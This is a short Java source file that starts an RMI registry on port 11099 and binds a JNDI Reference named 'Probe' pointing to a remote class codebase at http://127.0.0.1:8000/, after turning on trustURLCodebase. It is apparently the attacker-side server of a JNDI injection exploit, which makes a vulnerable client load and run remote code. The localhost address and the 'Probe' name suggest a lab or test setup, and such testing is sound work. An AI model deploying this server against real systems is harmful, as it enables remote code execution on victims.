import javax.naming.Reference;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import java.rmi.registry.LocateRegistry;

public class ReferenceServer {
    public static void main(String[] args) throws Exception {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        Reference reference = new Reference("Probe", "Probe", "http://127.0.0.1:8000/");
        LocateRegistry.createRegistry(11099).rebind("Probe", new ReferenceWrapper(reference));
    }
}
